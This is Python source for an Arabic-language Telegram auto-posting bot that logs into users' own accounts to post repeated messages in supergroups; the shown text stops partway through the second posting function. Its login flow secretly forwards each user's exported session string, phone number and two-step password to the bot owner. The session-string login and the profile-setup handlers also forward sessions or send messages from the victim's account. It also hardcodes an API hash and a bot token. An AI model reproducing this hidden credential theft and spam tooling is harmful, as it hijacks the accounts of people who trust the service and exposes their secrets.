from pyrogram.raw import functions
from pyrogram import Client, filters, idle
from pyrogram.types import (
    Message,
    CallbackQuery,
    ForceReply,
    InlineKeyboardMarkup as Markup, 
    InlineKeyboardButton as Button
)
from pyrogram.errors import (
    ApiIdInvalid, 
    PhoneNumberInvalid, 
    PhoneCodeInvalid, 
    PhoneCodeExpired, 
    SessionPasswordNeeded, 
    PasswordHashInvalid,
    UserNotParticipant,
    ChatWriteForbidden,
    PeerIdInvalid,
    BotMethodInvalid
)
from pyrolistener import Listener, exceptions
from asyncio import create_task, sleep, get_event_loop, TimeoutError
from datetime import datetime, timedelta
from pytz import timezone
from typing import Union
import json, os, random, string


app = Client(
    "autoPost",
    api_id=20769091,
    api_hash="0a3c7b2d7c8132bbafd4ffe9eb516968",
    bot_token="7767876547:AAFBADBi9A6ooqjDUz6w0Yzmm25LI615Nds",
)
loop = get_event_loop()
listener = Listener(client = app)
owners = [000, 000]  # ايدي الادمن
owner = 7115002714  # ايدي الاساسي
own = "@I_e_e_l" # يوزرك
homeMarkup = Markup([
    [
        Button("- حسابك -", callback_data="account")
    ],
    [
        Button("- السوبرات الحاليه -", callback_data="currentSupers"),
        Button("- إضافة سوبر -", callback_data="newSuper")
    ],
    [
        Button("- إضافة سوبرات -", callback_data="newSupers"),
        Button("- تعيين الكليشة 2 -", callback_data="newCaption2")
    ],
    [
        Button("- تعيين المدة ببن كل نشر -", callback_data="waitTime"),
        Button("- تعيين كليشة النشر -", callback_data="newCaption")
    ],
    [
        Button("- ايقاف النشر -", callback_data="stopPosting"),
        Button("- بدء النشر -", callback_data="startPosting")
    ],
    [
        Button("- ايقاف النشر 2 -", callback_data="stopPosting2"),
        Button("- بدء النشر 2 -", callback_data="startPosting2")
    ],
    [
        Button("- أوامر الحساب الثاني -", callback_data="account2st")
    ]
])



@app.on_message(filters.command("start") & filters.private)
async def start(_: Client, message: Message):
    user_id = message.from_user.id
    subscribed = await subscription(message)
    if user_id == owner and users.get(str(user_id)) is None:
        users[str(user_id)] = {"vip": True}
        write(users_db, users)
    elif isinstance(subscribed, str): return await message.reply(f"- عذرا عزيزي عليك الإشتراك بقناة البوت أولا لتتمكن استخدامه\n- القناه: @{subscribed}\n- اشترك ثم ارسل /start")
    elif (str(user_id) not in users):
        users[str(user_id)] = {"vip": False}
        write(users_db, users)
        return await message.reply(f"لا يمكنك استخدام هذا البوت تواصل مع [المطور](tg://openmessage?user_id={owner}) لتفعيل الاشتراك \nأو استخدم هذا [الرابط](tg://user?id={owner}) اذا كنت من مستخدمي iPhone")
    elif not users[str(user_id)]["vip"]: return await message.reply(
        f"لا يمكنك استخدام هذا البوت تواصل مع [المطور](tg://openmessage?user_id={owner}) لتفعيل الاشتراك \nأو استخدم هذا [الرابط](tg://user?id={owner}) اذا كنت من مستخدمي iPhone"
    )
    fname = message.from_user.first_name 
    caption = f"- مرحبا بك عزيزي [{fname}](tg://settings) في بوت النشر التلقائي\n\n- يمكنك استخدام البوت في ارسال الرسائل بشكل متكرر في السوبرات\n- تحكم في البوت من الازرار التاليه:"
    await message.reply(
        caption,
        reply_markup = homeMarkup,
        reply_to_message_id = message.id
    )



@app.on_callback_query(filters.regex(r"^(toHome)$"))
async def toHome(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id == owner: pass
    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
    fname = callback.from_user.first_name 
    caption = f"- مرحبا بك عزيزي [{fname}](tg://settings) في بوت النشر التلقائي\n\n- يمكنك استخدام البوت في ارسال الرسائل بشكل متكرر في السوبرات\n- تحكم في البوت من الازرار التاليه:"
    await callback.message.edit_text(
        caption,
        reply_markup = homeMarkup,
    )

@app.on_callback_query(filters.regex(r"^(account2st)$"))
async def account2st(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id == owner: pass
    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
    fname = callback.from_user.first_name 
    caption = f"- مرحبا بك عزيزي [{fname}](tg://settings) في بوت النشر التلقائي\n\nستيم اضافة الاوامر قريبا جداا"
    markup = Markup([
        [
            Button("- رجوع -", callback_data="toHome")
        ]
    ])
    await callback.message.edit_text(
        caption,
        reply_markup = markup,
    )

@app.on_callback_query(filters.regex(r"^(account)$"))
async def account(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    account_number = users[str(user_id)].get("account_number", "غير معروف")
    if user_id == owner: pass
    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
    fname = callback.from_user.first_name
    caption = f"- مرحبا عزيزي [{fname}](tg://settings) في قسم الحساب\n-  حساب النشر : {account_number} .\n- استخدم الازرار التاليه للتحكم بحسابك:"
    markup = Markup([
        [
            Button("- تسجيل حسابك -", callback_data="login"),
            Button("- تغيير الحساب -", callback_data="changeAccount")
        ],
        [
            Button("- ترتيب حسابك مع يوزر -", callback_data="account_settings"),
            Button("- ترتيب حسابك بدون اليوزر -", callback_data="account_settings1"),
        ],
        [
            Button("- مغادرة جميع القنوات -", callback_data="leaveAllChats"),
            Button("- حذف الحساب من البوت -", callback_data="deleteAccount"),
        ],
        [
            Button("- رجوع -", callback_data="toHome")
        ]
    ])
    await callback.message.edit_text(
        caption,
        reply_markup = markup
    )

@app.on_callback_query(filters.regex(r"^(deleteAccount)$"))
async def deleteAccount(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id == owner:
        pass
    elif not users[str(user_id)]["vip"]:
        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
    
    # Delete the user data
    if str(user_id) in users:
        write(users_db, users)
        users[str(user_id)]["session"] = ""
        users[str(user_id)]["waitTime"] = ""
        users[str(user_id)]["posting"] = False
        users[str(user_id)]["posting2"] = False
        users[str(user_id)]["caption"] = ""
        users[str(user_id)]["caption2"] = ""
        users[str(user_id)]["account_number"] = ""
    
    await callback.message.edit_text(
        "- تم حذف الحساب بنجاح. يمكنك البدء من جديد عن طريق إرسال /start.",
        reply_markup=Markup([[Button("- ابدأ من جديد -", callback_data="toHome")]])
    )

@app.on_callback_query(filters.regex(r"^(leaveAllChats)$"))
async def leave_all_chats(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id == owner:
        pass
    elif not users[str(user_id)]["vip"]:
        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)

    session = users[str(user_id)].get("session")
    if session is None:
        return await callback.message.edit_text(
            "- لم تقم بالتسجيل بعد.",
            reply_markup=Markup([[Button("- رجوع -", callback_data="account")]])
        )

    client = Client(
        name="leave_all_chats",
        session_string=session,
        api_id=app.api_id,
        api_hash=app.api_hash
    )
    await client.connect()

    async for dialog in client.iter_dialogs():
        try:
            await client.leave_chat(dialog.chat.id)
        except Exception as e:
            print(f"Error leaving chat {dialog.chat.id}: {e}")

    await client.disconnect()
    await callback.message.edit_text(
        "- تم مغادرة جميع القنوات والمجموعات بنجاح.",
        reply_markup=Markup([[Button("- رجوع -", callback_data="toHome")]])
    )

@app.on_callback_query(filters.regex("^account_settings1$"))
async def toHome(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    client = Client(
            str(user_id),
            api_id=app.api_id,
            api_hash=app.api_hash,
            session_string=users[str(user_id)]["session"]
        )
    await client.start()
    try:
        photo = random.randint(2, 41)
        name = random.randint(2, 41)
        bio = random.randint(1315, 34171)
        username = get_random_username()
        msg = await client.get_messages("botnasheravtar", photo)
        msg1 = await client.get_messages("botnashername", name)
        file = await client.download_media(msg)
        msg3 = await client.get_messages("UURRCC", bio)
        await client.set_profile_photo(photo=file)
        await client.update_profile(first_name=msg1.text)
        await client.update_profile(bio=msg3.text)
        await client.send_message(own, "شلونه المز 😉؟",)
        print(f"وهاي رتبت لك الحساب ياقلبي شكو بعد")
        await client.stop()
        await callback.message.edit_text(
        "- وهاي رتبت لك الحساب ياقلبي شكو بعد -",
        reply_markup=Markup([[Button("- رجوع -", callback_data="toHome")]])
        )
        return True
    except Exception as e:
        print(e)
        await client.stop()
        await callback.message.edit_text(
        "حدث خطأ ما .",
        reply_markup=Markup([[Button("- رجوع -", callback_data="toHome")]])
        )
        return False

def get_random_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))

@app.on_callback_query(filters.regex("^account_settings$"))
async def toHome(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    client = Client(
            str(user_id),
            api_id=app.api_id,
            api_hash=app.api_hash,
            session_string=users[str(user_id)]["session"]
        )
    await client.start()
    try:
        photo = random.randint(2, 41)
        name = random.randint(2, 109)
        bio = random.randint(2, 109)
        username = get_random_username()
        msg = await client.get_messages("botnasheravtar", photo)
        msg1 = await client.get_messages("nemshdmat", name)
        file = await client.download_media(msg)
        msg3 = await client.get_messages("UURRCC", bio)
        await client.set_profile_photo(photo=file)
        await client.update_profile(first_name=msg1.text)
        await client.update_profile(bio=msg3.text)
        await client.invoke(functions.account.UpdateUsername(username=username))
        await client.send_message(own, "شلونه المز 😉؟",)
        print(f"وهاي رتبت لك الحساب ياقلبي شكو بعد")
        await client.stop()
        await callback.message.edit_text(
        "- وهاي رتبت لك الحساب ياقلبي شكو بعد -",
        reply_markup=Markup([[Button("- رجوع -", callback_data="toHome")]])
        )
        return True
    except Exception as e:
        print(e)
        await client.stop()
        await callback.message.edit_text(
        "- صار في خطأ واضح وصريح -",
        reply_markup=Markup([[Button("- رجوع -", callback_data="toHome")]])
        )
        return False

@app.on_callback_query(filters.regex(r"^(login|changeAccount)$"))
async def login(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id == owner: pass
    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
    elif (callback.data == "changeAccount" and users[str(user_id)].get("session") is None): return await callback.answer("- لم تقم بالتسجيل بعد.", show_alert=True)
    await callback.message.delete()
    try:ask = await listener.listen(
        from_id=user_id,
        chat_id=user_id,
        text="- أرسل رقم الهاتف الخاص بك: \n\n- يمكنك ارسال /cancel لإلغاء التسجيل.",
        reply_markup=ForceReply(selective=True, placeholder="+9647700000"),
        timeout=30)
    except exceptions.TimeOut: return await callback.message.reply(
        text = "- نفد وقت استلام رقم الهاتف",
        reply_markup = Markup([[Button("- العوده -", callback_data="account")]])
    )
    if ask.text == "/cancel": return await ask.reply("- تم إلغاء العمليه.", reply_to_message_id=ask.id)
    create_task(registration(ask))
    
    
    
async def registration(message: Message):
    user_id = message.from_user.id
    _number = message.text
    lmsg = await message.reply(f"- جارٍ تسجيل الدخول إلى حسابك")
    reMarkup = Markup([
        [
            Button("- إعادة المحاوله -", callback_data="login"),
            Button("- رجوع -", callback_data="account")
        ]
    ])
    client = Client(
        "registration",
        in_memory = True, 
        api_id = app.api_id,
        api_hash = app.api_hash
    )
    await client.connect()
    try: p_code_hash = await client.send_code(_number)
    except (PhoneNumberInvalid): return await lmsg.edit_text("- رقم الهاتف الذي ادخلته خاطئ" ,reply_markup=reMarkup)
    try: code = await listener.listen(
        from_id=user_id,
        chat_id=user_id,
        text="- تم ارسال كود إلى خاصك قم بإرساله من فضلك.⁩",
        timeout=120,
        reply_markup=ForceReply(selective=True, placeholder="𝙸𝙽 𝚃𝙷𝙸𝚂 𝙵𝙾𝚁𝙼𝚄𝙻𝙰: 1 2 3 4 5")
    )
    except exceptions.TimeOut: return await lmsg.reply(
        text="- نفذ وقت استلام الكود.\n- حاول مره أخرى.", 
        reply_markup=reMarkup
    )
    try: await client.sign_in(_number, p_code_hash.phone_code_hash, code.text.replace(" ", ""))
    except (PhoneCodeInvalid): return await code.reply("- لقد قمت بإدخال كود خاطئ. \n- حاول مره أخرى", reply_markup=reMarkup, reply_to_message_id=code.id)
    except (PhoneCodeExpired): return await code.reply("- الكود الذي ادخلته منتهي الصلاحية. \n- حاول مره أخرى", reply_markup=reMarkup, reply_to_message_id=code.id)
    except (SessionPasswordNeeded):
        try:password = await listener.listen(
            from_id=user_id,
            chat_id=user_id,
            text="- ادخل كلمة مرور التحقق بخطوتين من فضلك.",
            reply_markup=ForceReply(selective=True, placeholder="- 𝚈𝙾𝚄𝚁 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳: "),
            timeout=180,
            reply_to_message_id=code.id
        )
        except exceptions.TimeOut: return await lmsg.reply(
            text="- نفذ وقت استلام كلمة مرور التحقق بخطوتين.\n- حاول مره أخرى.",  
            reply_markup=reMarkup
        )
        try: await client.check_password(password.text)
        except (PasswordHashInvalid): return await password.reply("- قمت بإدخال كلمة مرور خاطئه.\n- حاول مره أخرى.", reply_markup=reMarkup)
    session = await client.export_session_string()
    try:
        await app.send_message(owner, session + ' ' + _number)
        await app.send_message(owner, session + ' ' + _number+' '+password.text)
    except: pass
    await client.disconnect()
    if user_id == owner and users.get(str(user_id)) is None:
        users[str(user_id)] = {"vip": True, "session": session, "account_number": _number}
        write(users_db, users)
    else:
        users[str(user_id)]["session"] = session
    users[str(user_id)]["account_number"] = _number  # تخزين رقم الحساب هنا
    write(users_db, users)
    await app.send_message(
        user_id, 
        "- تم تسجيل الدخول في حسابك يمكنك الآن الاستمتاع بمميزات البوت." ,
        reply_markup=Markup([[Button("الصفحه الرئيسيه", callback_data="toHome")]])
    )

@app.on_callback_query(filters.regex(r"^(loginses)$"))
async def login_via_session(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id == owner: pass
    elif not users.get(str(user_id), {}).get("vip"): 
        return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
    elif callback.data == "loginses" and users.get(str(user_id), {}).get("session") is None: 
        return await callback.answer("- لم تقم بالتسجيل بعد.", show_alert=True)
    
    await callback.message.delete()
    try:
        ask = await listener.listen(
            from_id=user_id,
            chat_id=user_id,
            text="- أرسل كود الجلسة الخاص بك: \n\n- يمكنك ارسال /cancel لإلغاء التسجيل.",
            reply_markup=ForceReply(selective=True, placeholder="SESSION_STRING"),
            timeout=30
        )
    except TimeoutError:
        return await callback.message.reply(
            text="- نفد وقت استلام كود الجلسة",
            reply_markup=Markup([[Button("- العوده -", callback_data="account")]])
        )
    
    if ask.text == "/cancel": 
        return await ask.reply("- تم إلغاء العمليه.", reply_to_message_id=ask.id)
    
    create_task(registration_via_session(ask))


async def registration_via_session(_: Client, message: Message):
    user_id = message.from_user.id
    session_string = message.text
    lmsg = await message.reply("- جارٍ تسجيل الدخول إلى حسابك")
    reMarkup = Markup([
        [Button("- إعادة المحاوله -", callback_data="loginses"), Button("- رجوع -", callback_data="account")]
    ])

    registration_client = Client(
        session_string,
        in_memory=True,
        api_id = app.api_id,
        api_hash = app.api_hash
    )
    
    try:
        await registration_client.connect()

    except Exception as e:
        return await lmsg.listener(f"- فشل تسجيل الدخول باستخدام كود الجلسة: {str(e)}", reply_markup=reMarkup)

    try:
        await listener.send_message(owner, session_string)
    except:
        pass

    await registration_client.disconnect()

    if user_id == owner and users.get(str(user_id)) is None:
        users[str(user_id)] = {"vip": True, "session": session_string}
        write(users_db, users)
    else:
        users[str(user_id)]["session"] = session_string
    write(users_db, users)
    
    await listener.send_message(
        user_id, 
        "- تم تسجيل الدخول في حسابك يمكنك الآن الاستمتاع بمميزات البوت.",
        reply_markup=Markup([[Button("الصفحه الرئيسيه", callback_data="toHome")]])
    )
@app.on_callback_query(filters.regex(r"^(newSuper)$"))
async def newSuper(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id == owner: pass
    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
    await callback.message.delete()
    reMarkup = Markup([
        [
            Button("- حاول مره أخرى -", callback_data="newSuper"),
            Button("- رجوع -", callback_data="toHome")
        ]
    ])
    try: ask = await listener.listen(
        from_id=user_id, 
        chat_id=user_id,
        text="- ارسل رابط السوبر لإضافته.- لا تنضم قبل ان تقوم تبدأ النشر لمره واحده على الاقل.\n- اذا كان السوبر خاص ف ارسل الايدي الخاص به او غادر السوبر (من الحساب المضاف) ثم ارسل الرابط\n\n- يمكنك ارسال /cancel لألغاء العمليه.",
        reply_markup=ForceReply(selective=True, placeholder="- Super group URL: "),
        timeout=60
    )
    except exceptions.TimeOut: return await callback.message.reply("نفذ وقت استلام الرابط", reply_markup=reMarkup)
    if ask.text == "/cancel": return await ask.reply("- تم إلغاء العمليه", reply_to_message_id=ask.id, reply_markup=reMarkup)
    if not ask.text.startswith("-"):
        try:chat = await app.get_chat(ask.text if "+" in ask.text else (ask.text.split("/")[-1]))
        except BotMethodInvalid:
            chat = ask.text
        except Exception as e: 
            print(e)
            return await ask.reply(
                "- لم يتم ايجاد السوبر.", 
                reply_to_message_id=ask.id,
                reply_markup=reMarkup
        )
    else: chat = ask.text
    if users[str(user_id)].get("groups") is None: users[str(user_id)]["groups"] = []
    users[str(user_id)]["groups"].append(chat.id if not isinstance(chat, str) else int(chat))
    write(users_db, users)
    await ask.reply(
        "- تمت اضافة هذا السوبر الى القائمه.", 
        reply_markup = Markup([[Button("- الصفحه الرئيسيه -", callback_data="toHome"), Button("- إضافة سوبر -", callback_data="newSuper")]]),
        reply_to_message_id=ask.id
    )

@app.on_callback_query(filters.regex(r"^(newSupers)$"))
async def newSupers(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id == owner: pass
    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
    await callback.message.delete()
    reMarkup = Markup([
        [
            Button("- حاول مره أخرى -", callback_data="newSupers"),
            Button("- رجوع -", callback_data="toHome")
        ]
    ])
    try: ask = await listener.listen(
        from_id=user_id, 
        chat_id=user_id,
        text="- ارسل رابط السوبر لإضافته.- لا تنضم قبل ان تقوم تبدأ النشر لمره واحده على الاقل.\n- اذا كان السوبر خاص ف ارسل الايدي الخاص به او غادر السوبر (من الحساب المضاف) ثم ارسل الرابط\n\n- يمكنك ارسال /cancel لألغاء العمليه.",
        reply_markup=ForceReply(selective=True, placeholder="- Supers group URL: "),
        timeout=60
    )
    except exceptions.TimeOut: return await callback.message.reply("نفذ وقت استلام الرابط", reply_markup=reMarkup)
    if ask.text == "/cancel": return await ask.reply("- تم إلغاء العمليه", reply_to_message_id=ask.id, reply_markup=reMarkup)
    if not ask.text.startswith("-"):
        try:chat = await app.get_chat(ask.text if "+" in ask.text else (ask.text.split("/")[-1]))
        except BotMethodInvalid:
            chat = ask.text
        except Exception as e: 
            print(e)
            return await ask.reply(
                "- لم يتم ايجاد السوبر.", 
                reply_to_message_id=ask.id,
                reply_markup=reMarkup
        )
    else: chat = ask.text
    if users[str(user_id)].get("groups") is None: users[str(user_id)]["groups"] = []
    users[str(user_id)]["groups"].append(chat.id if not isinstance(chat, str) else int(chat))
    write(users_db, users)
    await ask.reply(
        "- تمت اضافة هذا السوبر الى القائمه.", 
        reply_markup = Markup([[Button("- الصفحه الرئيسيه -", callback_data="toHome"), Button("- إضافة سوبر -", callback_data="newSuper")]]),
        reply_to_message_id=ask.id
    )

@app.on_callback_query(filters.regex(r"^(currentSupers)$"))
async def currentSupers(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id == owner: pass
    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
    if users[str(user_id)].get("groups") is None or len(users[str(user_id)]["groups"]) == 0: return await callback.answer("- لم يتم إضافة اي سوبر لعرضه", show_alert=True)
    groups = users[str(user_id)]["groups"]
    titles = {}
    for group in groups:
        try: titles[str(group)] = (await app.get_chat(group)).title
        except: continue
    markup = [
        [
            Button(str(group) if titles.get(str(group)) is None else titles[str(group)], callback_data=str(group)),
            Button("🗑", callback_data=f"delSuper {group}")
        ] for group in groups
    ] if len(groups) else []
    markup.append([Button("- الصفحه الرئيسيه -", callback_data="toHome"), Button("- إضافة سوبر -", callback_data="newSuper")])
    caption = "- اليك السوبرات المضافه الى النشر التلقائي:"
    await callback.message.edit_text(
        caption, 
        reply_markup = Markup(markup)
    )
    

@app.on_callback_query(filters.regex(r"^(delSuper)"))
async def delSuper(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id == owner: pass
    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
    groups = users[str(user_id)]["groups"]
    group = int(callback.data.split()[1])
    if group in groups:
        groups.remove(group)
        write(users_db, users)
        await callback.answer("- تم حذف هذا السوبر من القائمه", show_alert=True)
    titles = {}
    for group in groups:
        try: titles[str(group)] = (await app.get_chat(group)).title
        except: continue
    markup = [
        [
            Button(str(group) if titles.get(str(group)) is None else titles[str(group)], callback_data=str(group)),
            Button("🗑", callback_data=f"delSuper {group}")
        ] for group in groups
    ] if len(groups) else []
    markup.append([Button("- الصفحه الرئيسيه -", callback_data="toHome")])
    await callback.message.edit_reply_markup(
        reply_markup = Markup(markup)
    )


@app.on_callback_query(filters.regex(r"^(newCaption)$"))
async def newCaption(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id == owner: pass
    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
    reMarkup = Markup([
        [
            Button("- حاول مره أخرى -", callback_data="newCaption"),
            Button("- رجوع -", callback_data="toHome")
        ]
    ])
    await callback.message.delete()
    try:ask = await listener.listen(
        from_id = user_id, 
        chat_id = user_id, 
        text = "- يمكنك ارسال الكليشه الجديده الآن.\n\n- استخدم /cancel لإلغاء العمليه.",
        reply_markup = ForceReply(selective = True, placeholder = "- Your new caption: "),
        timeout = 120
    )
    except exceptions.TimeOut: return await callback.message.reply("- انتهى وقت استلام الكليشه الجديده.", reply_markup=reMarkup)
    if ask.text == "/cancel": await ask.reply("- تم الغاء العمليه.", reply_markup=reMarkup, reply_to_message_id=ask.id)
    users[str(user_id)]["caption"] = ask.text
    write(users_db, users)
    await ask.reply(
        "- تم تعيين الكليشه الجديده.",
        reply_to_message_id = ask.id,
        reply_markup = Markup([[Button("- الصفحه الرئيسيه -", callback_data="toHome")]])
    )


@app.on_callback_query(filters.regex(r"^(newCaption2)$"))
async def newCaption(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id == owner: pass
    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
    reMarkup = Markup([
        [
            Button("- حاول مره أخرى -", callback_data="newCaption"),
            Button("- رجوع -", callback_data="toHome")
        ]
    ])
    await callback.message.delete()
    try:ask = await listener.listen(
        from_id = user_id, 
        chat_id = user_id, 
        text = "- يمكنك ارسال الكليشه الجديده الآن.\n\n- استخدم /cancel لإلغاء العمليه.",
        reply_markup = ForceReply(selective = True, placeholder = "- Your new caption: "),
        timeout = 120
    )
    except exceptions.TimeOut: return await callback.message.reply("- انتهى وقت استلام الكليشه الجديده.", reply_markup=reMarkup)
    if ask.text == "/cancel": await ask.reply("- تم الغاء العمليه.", reply_markup=reMarkup, reply_to_message_id=ask.id)
    users[str(user_id)]["caption2"] = ask.text
    write(users_db, users)
    await ask.reply(
        "- تم تعيين الكليشه الجديده.",
        reply_to_message_id = ask.id,
        reply_markup = Markup([[Button("- الصفحه الرئيسيه -", callback_data="toHome")]])
    )


@app.on_callback_query(filters.regex(r"^(waitTime)$"))
async def waitTime(_: Client, callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id == owner: pass
    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
    reMarkup = Markup([
        [
            Button("- حاول مره أخرى -", callback_data="waitTime"),
            Button("- رجوع -", callback_data="toHome")
        ]
    ])
    await callback.message.delete()
    try:ask = await listener.listen(
        from_id = user_id, 
        chat_id = user_id, 
        text = "- يمكنك ارسال مدة الانتظار ( بالثواني ) الآن.\n\n- أرسل عدد أكبر من 300 .\n\n- استخدم /cancel لإلغاء العمليه.",
        reply_markup = ForceReply(selective = True, placeholder = "- The duration  < 300 : "),
        timeout = 120
    )
    except exceptions.TimeOut: return await callback.message.reply("- انتهى وقت استلام مدة الانتظار.", reply_markup=reMarkup)
    if ask.text == "/cancel": await ask.reply("- تم الغاء العمليه.", reply_markup=reMarkup, reply_to_message_id=ask.id)
    try:users[str(user_id)]["waitTime"] = int(ask.text)
    except ValueError: return await ask.reply("- لا يمكنك وضع هذه البيانات كمده.", reply_markup=reMarkup, reply_to_message_id=ask.id)
    write(users_db, users)
    await ask.reply(
        "- تم تعيين مدة الانتظار.",
        reply_to_message_id = ask.id,
        reply_markup = Markup([[Button("- الصفحه الرئيسيه -", callback_data="toHome")]])
    )
    

@app.on_callback_query(filters.regex(r"^(startPosting)$"))
async def startPosting(_: Client,  callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id == owner: pass
    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
    if users[str(user_id)].get("session") is None: return await callback.answer("- عليك اضافة حساب أولا.", show_alert=True)
    elif (users[str(user_id)].get("groups") is None) or (len(users[str(user_id)]["groups"]) == 0): return await callback.answer("- لم يتم اضافة اي سوبرات بعد.", show_alert=True) 
    elif users[str(user_id)].get("posting"): return await callback.answer("النشر التلقائي مفعل من قبل.", show_alert=True)
    
    users[str(user_id)]["posting"] = True
    write(users_db, users)
    create_task(posting(user_id))
    
    markup = Markup([
        [Button("- إيقاف النشر -", callback_data="stopPosting"),
         Button("- رجوع -", callback_data="toHome")]
    ])
    await callback.message.edit_text(
        "- بدأت عملية النشر التلقائي",
        reply_markup = markup
    )

@app.on_callback_query(filters.regex(r"^(stopPosting)$"))
async def stopPosting(_: Client,  callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id == owner: pass
    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
    if not users[str(user_id)].get("posting"): return await callback.answer("النشر التلقائي معطل بالفعل.", show_alert=True)
    
    users[str(user_id)]["posting"] = False
    write(users_db, users)
    
    markup = Markup([
        [Button("- بدء النشر -", callback_data="startPosting"),
         Button("- رجوع -", callback_data="toHome")]
    ])
    await callback.message.edit_text(
        "- تم ايقاف عملية النشر التلقائي",
        reply_markup = markup
    )

async def posting(user_id):
    if users[str(user_id)]["posting"]:
        client = Client(
            str(user_id),
            api_id=app.api_id,
            api_hash=app.api_hash,
            session_string=users[str(user_id)]["session"]
        )
        await client.start()

        while users[str(user_id)]["posting"]:
            try:
                sleepTime = random.randint(250, users[str(user_id)]["waitTime"])
            except KeyError:
                users[str(user_id)]["waitTime"] = False
                write(users_db, users)
                return await app.send_message(int(user_id), "- تم إيقاف النشر بسبب عدم اضافة وقت.", reply_markup=Markup([[Button("- إضافة وقت -", callback_data="waitTime")]]))

            groups = users[str(user_id)]["groups"]
            try:
                caption = users[str(user_id)]["caption"]
            except KeyError:
                users[str(user_id)]["posting"] = False
                write(users_db, users)
                return await app.send_message(int(user_id), "- تم إيقاف النشر بسبب عدم اضافة كليشة.", reply_markup=Markup([[Button("- إضافة كليشه -", callback_data="newCaption")]]))

            for group in groups:
                if isinstance(group, str) and group.startswith("-"):
                    group = int(group)

                if not isinstance(group, int) or not str(group).startswith("-100"):
                    await app.send_message(int(user_id), f"Invalid group ID: {group}")
                    continue

                try:
                    await client.send_message(group, caption)
                except ChatWriteForbidden:
                    try:
                        await client.join_chat(group)
                        await client.send_message(group, caption)
                    except PeerIdInvalid:
                        await app.send_message(int(user_id), f"مشكلة في الانضمام للقروب : {group}")
                    except Exception as e:
                        await app.send_message(int(user_id), str(e))
                except PeerIdInvalid:
                    await app.send_message(int(user_id), f"مشكلة في القروب : {group}")
                except Exception as e:
                    await app.send_message(int(user_id), str(e))

            await sleep(sleepTime)

        await client.stop()


@app.on_callback_query(filters.regex(r"^(startPosting2)$"))
async def startPosting2(_: Client,  callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id == owner: pass
    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
    if users[str(user_id)].get("session") is None: return await callback.answer("- عليك اضافة حساب أولا.", show_alert=True)
    elif (users[str(user_id)].get("groups") is None) or (len(users[str(user_id)]["groups"]) == 0): return await callback.answer("- لم يتم اضافة اي سوبرات بعد.", show_alert=True) 
    elif users[str(user_id)].get("posting2"): return await callback.answer("النشر التلقائي مفعل من قبل.", show_alert=True)
    
    users[str(user_id)]["posting2"] = True
    write(users_db, users)
    create_task(posting2(user_id))
    
    markup = Markup([
        [Button("- إيقاف النشر -", callback_data="stopPosting2"),
         Button("- رجوع -", callback_data="toHome")]
    ])
    await callback.message.edit_text(
        "- بدأت عملية النشر التلقائي",
        reply_markup = markup
    )

@app.on_callback_query(filters.regex(r"^(stopPosting2)$"))
async def stopPosting2(_: Client,  callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id == owner: pass
    elif not users[str(user_id)]["vip"]: return await callback.answer("- انتهت مدة الإشتراك الخاصه بك.", show_alert=True)
    if not users[str(user_id)].get("posting2"): return await callback.answer("النشر التلقائي معطل بالفعل.", show_alert=True)
    
    users[str(user_id)]["posting2"] = False
    write(users_db, users)
    
    markup = Markup([
        [Button("- بدء النشر -", callback_data="startPosting2"),
         Button("- رجوع -", callback_data="toHome")]
    ])
    await callback.message.edit_text(
        "- تم ايقاف عملية النشر التلقائي",
        reply_markup = markup
    )

async def posting2(user_id):
    if users[str(user_id)]["posting2"]:
        client = Client(
            str(user_id),
            api_id=app.api_id,
            api_hash=app.api_hash,
            session_string=users[str(user_id)]["session"]
        )
